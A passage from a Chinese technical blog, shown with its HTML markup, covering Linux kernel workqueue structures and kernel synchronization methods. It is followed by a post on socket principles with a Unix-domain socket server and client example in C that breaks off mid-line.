class="meta">#<span class="meta-keyword">define</span> WORK_STRUCT_PENDING 0        <span class="comment">/* T if work item pending execution */</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WORK_STRUCT_FLAG_MASK (3UL)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> WORK_STRUCT_WQ_DATA_MASK (~WORK_STRUCT_FLAG_MASK)</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">entry</span>;</span>         <span class="comment">/* 中断下半部处理函数的链表 */</span></span><br><span class="line">    <span class="keyword">work_func_t</span> func;               <span class="comment">/* 处理中断下半部工作的函数 */</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_LOCKDEP</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">lockdep_map</span> <span class="title">lockdep_map</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 在kernel/workqueue.c文件中定义</span></span><br><span class="line"><span class="comment"> * 每个工作者线程对应一个cpu_workqueue_struct,其中包含要处理的工作的链表</span></span><br><span class="line"><span class="comment"> * (即work_struct的链表,当此链表不空时,唤醒工作者线程来进行处理)</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cpu_workqueue_struct</span> &#123;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">spinlock_t</span> lock;                   <span class="comment">/* 锁保护这种结构 */</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">worklist</span>;</span>         <span class="comment">/* 工作队列头节点 */</span></span><br><span class="line">    <span class="keyword">wait_queue_head_t</span> more_work;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> *<span class="title">current_work</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">workqueue_struct</span> *<span class="title">wq</span>;</span>       <span class="comment">/* 关联工作队列结构 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">thread</span>;</span>        <span class="comment">/* 关联线程 */</span></span><br><span class="line">&#125; ____cacheline_aligned;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 也是在kernel/workqueue.c文件中定义的</span></span><br><span class="line"><span class="comment"> * 每个workqueue_struct表示一种工作者类型,系统默认的就是events工作者类型</span></span><br><span class="line"><span class="comment"> * 每个工作者类型一般对应n个工作者线程,n就是处理器的个数</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">workqueue_struct</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">cpu_workqueue_struct</span> *<span class="title">cpu_wq</span>;</span>  <span class="comment">/* 工作者线程 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *name;</span><br><span class="line">    <span class="keyword">int</span> singlethread;</span><br><span class="line">    <span class="keyword">int</span> freezeable;        <span class="comment">/* Freeze threads during suspend */</span></span><br><span class="line">    <span class="keyword">int</span> rt;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_LOCKDEP</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">lockdep_map</span> <span class="title">lockdep_map</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h2 id="内核同步"><a href="#内核同步" class="headerlink" title="内核同步"></a>内核同步</h2><p>存在共享资源（共享一个文件，一块内存等等）的时候，为了防止并发访问时共享资源的数据不一致，引入了同步机制</p>
<p>所谓同步，其实防止在临界区中形成竞争条件：</p>
<ul>
<li>临界区 - 也称为临界段，就是访问和操作共享数据的代码段</li>
<li>竞争条件 - 2个或2个以上线程在临界区里同时执行的时候，就构成了竞争条件</li>
</ul>
<p>内核同步常见方法如下：</p>
<p><strong>原子操作</strong></p>
<p>原子操作是由编译器来保证的，保证一个线程对数据的操作不会被其他线程打断</p>
<ul>
<li>所谓原子操作是指不会被线程调度机制打断的操作，这种操作一旦开始，就一直运行到结束，中间不会有任何 context switch</li>
</ul>
<p><strong>加锁</strong></p>
<p>为了给临界区加锁，保证临界区数据的同步，首先了解一下内核中哪些情况下会产生并发 </p>
<p>内核中造成竞争条件的原因：</p>
<div class="table-container">
<table>
<thead>
<tr>
<th><strong>竞争原因</strong></th>
<th><strong>说明</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td>中断</td>
<td>中断随时会发生，也就会随时打断当前执行的代码，如果中断和被打断的代码在相同的临界区，就产生了竞争条件</td>
</tr>
<tr>
<td>软中断和tasklet</td>
<td>软中断和 tasklet 也会随时被内核唤醒执行，也会像中断一样打断正在执行的代码</td>
</tr>
<tr>
<td>内核抢占</td>
<td>内核具有抢占性，发生抢占时，如果抢占的线程和被抢占的线程在相同的临界区，就产生了竞争条件</td>
</tr>
<tr>
<td>睡眠及用户空间的同步</td>
<td>用户进程睡眠后，调度程序会唤醒一个新的用户进程，新的用户进程和睡眠的进程可能在同一个临界区中</td>
</tr>
<tr>
<td>对称多处理</td>
<td>2个或多个处理器可以同时执行相同的代码</td>
</tr>
</tbody>
</table>
</div>
<p>常见的锁有以下几类：</p>
<ul>
<li>自旋锁：当一个线程获取了锁之后，其他试图获取这个锁的线程一直在循环等待获取这个锁，直至锁重新可用（由于线程实在一直循环的获取这个锁，所以会造成CPU处理时间的浪费，因此最好将自旋锁用于能很快处理完的临界区）</li>
<li>互斥锁：互斥锁也是一种可以睡眠的锁，相当于二值信号量，只是提供的API更加简单，使用的场景也更严格一些 </li>
</ul>
<p><strong>信号量</strong></p>
<p>信号量也是一种锁，和自旋锁不同的是，进程获取不到信号量的时候，不会像自旋锁一样循环的去试图获取锁，而是进入睡眠（进入等待队列），直至有信号量释放出来时，才会唤醒睡眠的进程，进入临界区执行</p>
<p>信号量结构体具体如下： </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">semaphore</span> &#123;</span></span><br><span class="line">    <span class="keyword">spinlock_t</span>        lock;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span>        count; <span class="comment">/* 信号量计数 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span>    <span class="title">wait_list</span>;</span> <span class="comment">/* 等待队列 */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>其实信号量就相当于一个 [常数] 加上一个 [等待队列]：</p>
<ul>
<li>[常数] &gt; 0：代表了当前临界区可以容纳的进程个数</li>
<li>[常数] = 0：争用信号量的进程会进入睡眠（进入等待队列）</li>
<li>[常数] &lt; 0：在等待队列中的进程数目</li>
</ul>
<p>当一个进程进入临界区时，会先检查该临界区的 <code>semaphore-&gt;count</code>：</p>
<ul>
<li>如果大于“0”就进入该临界区，同时 <code>semaphore-&gt;count--</code></li>
<li>如果小于等于“0”就进入 <code>semaphore-&gt;wait_list</code>，同时 <code>semaphore-&gt;count--</code></li>
</ul>
<p>当一个进程离开临界区时，也会检查该临界区的 <code>semaphore-&gt;count</code>：</p>
<ul>
<li>如果小于“0”就把 <code>semaphore-&gt;wait_list</code> 中的一个进程放入临界区，同时 <code>semaphore-&gt;count++</code></li>
<li>如果大于等于“0”，只执行 <code>semaphore-&gt;count++</code> 就可以了</li>
</ul>
<p><strong>完成变量</strong></p>
<p>完成变量的机制类似于信号量，比如一个线程A进入临界区之后，另一个线程B会在完成变量上等待，线程A完成了任务出了临界区之后，使用完成变量来唤醒线程B</p>
<ul>
<li>如果在内核中一个任务需要发出信号通知另一任务发生了某个特定事件，利用完成变量（completion variable）是使两个任务得以同步的简单方法</li>
<li>如果一个任务要执行一些工作时，另一个任务就会在完成变量上等待</li>
</ul>
<p><strong>同步方法选择</strong></p>
<img src="/2022/08/18/Linux%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/1660900515527.png" class width="1660900515527"> 

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/18/%E7%BD%91%E7%BB%9C%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%EF%BC%9ASocket%E5%8E%9F%E7%90%86/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/08/18/%E7%BD%91%E7%BB%9C%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%EF%BC%9ASocket%E5%8E%9F%E7%90%86/" class="post-title-link" itemprop="url">网络相关知识：Socket原理</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>
              

              <time title="Created: 2022-08-18 00:00:37 / Modified: 00:05:22" itemprop="dateCreated datePublished" datetime="2022-08-18T00:00:37+08:00">2022-08-18</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Knowledge/" itemprop="url" rel="index"><span itemprop="name">Knowledge</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>4.9k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>4 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="TCP-IP-amp-UDP"><a href="#TCP-IP-amp-UDP" class="headerlink" title="TCP/IP &amp; UDP"></a>TCP/IP &amp; UDP</h2><p>TCP/IP（Transmission Control Protocol/Internet Protocol）：</p>
<ul>
<li>输控制协议/网间协议，是一个工业标准的协议集（一系列网络协议的总和），它是为广域网设计的</li>
</ul>
<p>UDP（User Data Protocol）：</p>
<ul>
<li>用户数据报协议，是与 TCP 相对应的协议，它是属于 TCP/IP 协议族中的一种 </li>
</ul>
<img src="/2022/08/18/%E7%BD%91%E7%BB%9C%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%EF%BC%9ASocket%E5%8E%9F%E7%90%86/1641473679035.png" class width="1641473679035"> 
<h2 id="Socket简述"><a href="#Socket简述" class="headerlink" title="Socket简述"></a>Socket简述</h2><p><strong>Socket</strong> 就是应用层与 TCP/IP 协议族通信的中间软件抽象层，它是一组接口：</p>
<img src="/2022/08/18/%E7%BD%91%E7%BB%9C%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%EF%BC%9ASocket%E5%8E%9F%E7%90%86/1641473787712.png" class width="1641473787712"> 
<ul>
<li>socket 可以大大简化“网络通信编程”，我们不需要完全掌握这种编程的各个细节，只需要使用 socket 的接口就可以了</li>
</ul>
<img src="/2022/08/18/%E7%BD%91%E7%BB%9C%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%EF%BC%9ASocket%E5%8E%9F%E7%90%86/1641474031711.png" class width="1641474031711"> 
<h2 id="网络通信"><a href="#网络通信" class="headerlink" title="网络通信"></a>网络通信</h2><p>本地的进程间通信（IPC）有很多种方式，但可以总结为下面4类：</p>
<ul>
<li>消息传递（管道、FIFO、消息队列）</li>
<li>同步（互斥量、条件变量、读写锁、文件和写记录锁、信号量）</li>
<li>共享内存（匿名的和具名的）</li>
<li>远程过程调用（Solaris 门和 Sun RPC）</li>
</ul>
<p>在进行网络通信之前，系统需要先“识别”程序，TCP/IP 协议族完成了这个功能：</p>
<ul>
<li>网络层的 <strong>ip地址</strong> 可以唯一标识网络中的主机</li>
<li>传输层的 <strong>协议+端口</strong> 可以唯一标识主机中的应用程序（进程）</li>
</ul>
<p>这样利用三元组（ip地址，协议，端口）就可以标识网络的进程了</p>
<h2 id="Socket函数"><a href="#Socket函数" class="headerlink" title="Socket函数"></a>Socket函数</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">socket</span><span class="params">(<span class="keyword">int</span> domain, <span class="keyword">int</span> type, <span class="keyword">int</span> protocol)</span></span></span><br></pre></td></tr></table></figure>
<p>用于创建一个 socket 描述符，它唯一标识一个 socket </p>
<ul>
<li>domain：即协议域，又称为协议族（family），协议族决定了 socket 的地址类型，在通信中必须采用对应的地址</li>
<li>type：指定socket类型</li>
<li>protocol：故名思意，就是指定协议</li>
<li>return：返回一个文件描述符 sockfd（描述字它存在于协议族空间中，但没有一个具体的地址）<ul>
<li>如果想要给它赋值一个地址，就必须调用 bind() 函数</li>
<li>否则就当调用 connect() 时系统会自动随机分配一个端口 </li>
</ul>
</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bind</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">const</span> struct sockaddr *addr, <span class="keyword">socklen_t</span> addrlen)</span></span></span><br></pre></td></tr></table></figure>
<p>把一个地址族中的特定地址赋给 socket </p>
<ul>
<li>sockfd：即socket描述字，它是通过 socket() 函数创建了，唯一标识一个socket，bind()函数就是将给这个描述字绑定一个名字</li>
<li>addr：一个 const struct sockaddr * 指针，指向要绑定给 sockfd 的协议地址，这个地址结构根据地址创建 socket 时的地址协议族的不同而不同</li>
<li>addrlen：地址的长度 </li>
</ul>
<p>通常服务器在启动的时候都会绑定一个众所周知的地址（如ip地址+端口号），用于提供服务，客户就可以通过它来接连服务器</p>
<p>而客户端就不用指定，有系统自动分配一个端口号和自身的ip地址组合就行</p>
<ul>
<li>这就是为什么通常服务器端在 listen 之前会调用 bind，而客户端就不会调用，而是在 connect 时由系统随机生成一个</li>
</ul>
<p>socket 函数创建的 socket 默认是一个主动类型的，listen 函数将 socket 变为被动类型的，等待客户的连接请求：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">listen</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">int</span> backlog)</span></span></span><br></pre></td></tr></table></figure>
<ul>
<li>sockfd：即 socket 描述字</li>
<li>backlog：相应 socket 可以排队的最大连接个数 </li>
</ul>
<p>服务端通过调用 accept 函数来接受客户端的 connect 请求：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">accept</span><span class="params">(<span class="keyword">int</span> sockfd, struct sockaddr *addr, <span class="keyword">socklen_t</span> *addrlen)</span></span></span><br></pre></td></tr></table></figure>
<ul>
<li>sockfd：即 socket 描述字</li>
<li>addr：服务器的 socket 地址 </li>
<li>addrlen：地址的长度</li>
</ul>
<p>客户端通过调用 connect 函数来建立与 TCP 服务器的连接（服务器必须先调用 listen 开启监听）：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">connect</span><span class="params">(<span class="keyword">int</span> sockfd, <span class="keyword">const</span> struct sockaddr *addr, <span class="keyword">socklen_t</span> addrlen)</span></span></span><br></pre></td></tr></table></figure>
<ul>
<li>sockfd：即 socket 描述字</li>
<li>addr：服务器的 socket 地址 </li>
<li>addrlen：地址的长度</li>
</ul>
<p>TCP 服务器端依次调用 socket、bind、listen 之后，就会监听指定的 socket 地址了</p>
<p>TCP 客户端依次调用 socket、connect 之后就想 TCP 服务器发送了一个连接请求</p>
<p>TCP 服务器监听到这个请求之后，就会调用 accept 函数取接收请求，这样连接就建立好了 </p>
<ul>
<li>如果 accpet 成功，那么其返回值是由内核自动生成的一个全新的描述字，代表与返回客户的 TCP 连接 </li>
</ul>
<h2 id="三次握手-四次释放"><a href="#三次握手-四次释放" class="headerlink" title="三次握手 四次释放"></a>三次握手 四次释放</h2><p>一，TCP建立连接要进行“三次握手”，即交换三个分组，大致流程如下：</p>
<ul>
<li>客户端向服务器发送一个 SYN J</li>
<li>服务器向客户端响应一个 SYN K，并对 SYN J 进行确认 ACK J+1</li>
<li>客户端再想服务器发一个确认 ACK K+1</li>
</ul>
<img src="/2022/08/18/%E7%BD%91%E7%BB%9C%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%EF%BC%9ASocket%E5%8E%9F%E7%90%86/1641475541309.png" class width="1641475541309"> 
<ul>
<li>当客户端调用 connect 时，触发了连接请求，向服务器发送了 SYN J 包，这时 connect 进入阻塞状态</li>
<li>服务器监听到连接请求，即收到 SYN J 包，调用 accept 函数接收请求向客户端发送 SYN K ，ACK J+1，这时 accept 进入阻塞状态</li>
<li>客户端收到服务器的 SYN K ，ACK J+1 之后，这时 connect 返回，并对 SYN K 进行确认，服务器收到 ACK K+1 时，accept 返回，至此三次握手完毕，连接建立</li>
</ul>
<p>二，socket中有四次握手释放连接的过程，流程如下：</p>
<ul>
<li>某个应用进程首先调用 close 主动关闭连接，这时 TCP 发送一个 FIN M</li>
<li>另一端接收到 FIN M 之后，执行被动关闭，对这个 FIN 进行确认（它的接收也作为文件结束符 EOF 传递给应用进程，因为 FIN 的接收意味着应用进程在相应的连接上再也接收不到额外数据）</li>
<li>一段时间之后，接收到文件结束符 EOF 的应用进程调用 close 关闭它的 socket，这导致它的 TCP 也发送一个 FIN N</li>
<li>接收到这个 FIN 的源发送端 TCP 对它进行确认</li>
</ul>
<img src="/2022/08/18/%E7%BD%91%E7%BB%9C%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%EF%BC%9ASocket%E5%8E%9F%E7%90%86/1641475703919.png" class width="1641475703919"> 
<ul>
<li>这样每个方向上都有一个 FIN 和 ACK </li>
</ul>
<h2 id="本地进程间通信案例"><a href="#本地进程间通信案例" class="headerlink" title="本地进程间通信案例"></a>本地进程间通信案例</h2><p><strong>服务端</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/un.h&gt;</span>   </span></span><br><span class="line">   </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CAN_SERVICE <span class="meta-string">&quot;B&quot;</span> </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span>  </span></span><br><span class="line"><span class="function"></span>&#123;      </span><br><span class="line">    <span class="keyword">int</span> ret;     </span><br><span class="line">    <span class="keyword">int</span> len;  </span><br><span class="line">    <span class="keyword">int</span> accept_fd;</span><br><span class="line">    <span class="keyword">int</span> socket_fd; </span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">char</span> recv_buf[<span class="number">1024</span>];</span><br><span class="line">    <span class="keyword">socklen_t</span> clt_addr_len; </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_un</span> <span class="title">clt_addr</span>;</span>  </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_un</span> <span class="title">srv_addr</span>;</span>  </span><br><span class="line"></span><br><span class="line">    socket_fd=socket(PF_UNIX,SOCK_STREAM,<span class="number">0</span>);  </span><br><span class="line">    <span class="keyword">if</span>(socket_fd&lt;<span class="number">0</span>)  </span><br><span class="line">    &#123;  </span><br><span class="line">        perror(<span class="string">&quot;cannot create communication socket&quot;</span>);  </span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;  </span><br><span class="line">    &#125;    </span><br><span class="line">          </span><br><span class="line">    <span class="comment">// 设置服务端参数(服务端的sockaddr必须和客户端的sockaddr一样)  </span></span><br><span class="line">    srv_addr.sun_family=AF_UNIX;  </span><br><span class="line">    <span class="built_in">strncpy</span>(srv_addr.sun_path,CAN_SERVICE,<span class="keyword">sizeof</span>(srv_addr.sun_path)<span class="number">-1</span>);  </span><br><span class="line">    unlink(CAN_SERVICE);  </span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 绑定socket地址 </span></span><br><span class="line">    ret=bind(socket_fd,(struct sockaddr*)&amp;srv_addr,<span class="keyword">sizeof</span>(srv_addr));  </span><br><span class="line">    <span class="keyword">if</span>(ret==<span class="number">-1</span>)  </span><br><span class="line">    &#123;  </span><br><span class="line">        perror(<span class="string">&quot;cannot bind server socket&quot;</span>);  </span><br><span class="line">        close(socket_fd);  </span><br><span class="line">        unlink(CAN_SERVICE);  </span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 监听   </span></span><br><span class="line">    ret=listen(socket_fd,<span class="number">1</span>);  </span><br><span class="line">    <span class="keyword">if</span>(ret==<span class="number">-1</span>)  </span><br><span class="line">    &#123;  </span><br><span class="line">        perror(<span class="string">&quot;cannot listen the client connect request&quot;</span>);  </span><br><span class="line">        close(socket_fd);  </span><br><span class="line">        unlink(CAN_SERVICE);  </span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 接受connect请求 </span></span><br><span class="line">    len=<span class="keyword">sizeof</span>(clt_addr);  </span><br><span class="line">    accept_fd=accept(socket_fd,(struct sockaddr*)&amp;clt_addr,&amp;len);  </span><br><span class="line">    <span class="keyword">if</span>(accept_fd&lt;<span class="number">0</span>)  </span><br><span class="line">    &#123;  </span><br><span class="line">        perror(<span class="string">&quot;cannot accept client connect request&quot;</span>);  </span><br><span class="line">        close(socket_fd);  </span><br><span class="line">        unlink(CAN_SERVICE);  </span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line"> </span><br><span class="line">    <span class="comment">// 读取和写入  </span></span><br><span class="line">    <span class="built_in">memset</span>(recv_buf,<span class="number">0</span>,<span class="number">1024</span>);  </span><br><span class="line">    <span class="keyword">int</span> num=read(accept_fd,recv_buf,<span class="keyword">sizeof</span>(recv_buf));  </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Message from client (%d)) :%s\n&quot;</span>,num,recv_buf);    </span><br><span class="line">         </span><br><span class="line">    <span class="comment">// 关闭socket</span></span><br><span class="line">    close(accept_fd);  </span><br><span class="line">    close(socket_fd);  </span><br><span class="line">    unlink(CAN_SERVICE);  </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>客户端</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span>  </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/un.h&gt;</span>  </span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> CAN_SERVICE <span class="meta-string">&quot;B&quot;</span> </span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span>  </span></span><br><span class="line"><span class="function"></span>&#123; </span><br><span class="line">    <span class="keyword">int</span> ret;  </span><br><span class="line">    <span class="keyword">int</span> socket_fd;   </span><br><span class="line">    <span class="keyword">char</span> snd_buf[<span class="number">1024</span>];   </span><br><span class="line">    <span class="keyword">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_un</span> <span class="title">srv_addr</span>;</span>  </span><br><span class="line">    </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,PF_UNIX);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,SOCK_STREAM);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 创建socket </span></span><br><span class="line">    socket_fd=socket(PF_UNIX,SOCK_STREAM,<span class="number">0</span>);  </span><br><span class="line">    <span class="keyword">if</span>(socket_fd&lt;<span class="number">0</span>)  </span><br><span class="line">    &#123;  </span><br><span class="line">        perror(<span class="string">&quot;cannot create communication socket&quot;</span>);  </span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;  </span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 设置客户端参数(客户端的sockaddr必须和服务端的sockaddr一样) </span></span><br><span class="line">    srv_addr.sun_family=AF_UNIX;  </span><br><span class="line">    <span class="built_in">strcpy</span>(srv_addr.sun_path,CAN_SERVICE);  </span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 连接到服务端</span></span><br><span class="line">    ret=connect(socket_fd,(struct sockaddr*)&amp;srv_addr,<span class="keyword">sizeof</span>(srv_addr)); </span><br><span class="line">    <span class="keyword">if</span>(ret==<span class="number">-1</span>)  </span><br><span class="line">    &#123;  </span><br><span class="line">        perror(<span class="string">&quot;cannot connect to the server&quot;</span>);  </span><br><span class="line">        close(socket_fd);  </span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">    <span class="built_in">memset</span>(snd_buf,<span class="number">0</span>,<span class="number">1024</span>);  </span><br><span class="line">    <span class="built_in">strcpy</span>(snd_buf,<span class="string">&quot;message from client&quot;</span>);  </span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 读取和写入    </span></span><br><span class="line">    write(socket_fd,snd_buf,<span class="keyword">sizeof</span>(snd_buf));  </span><br><span 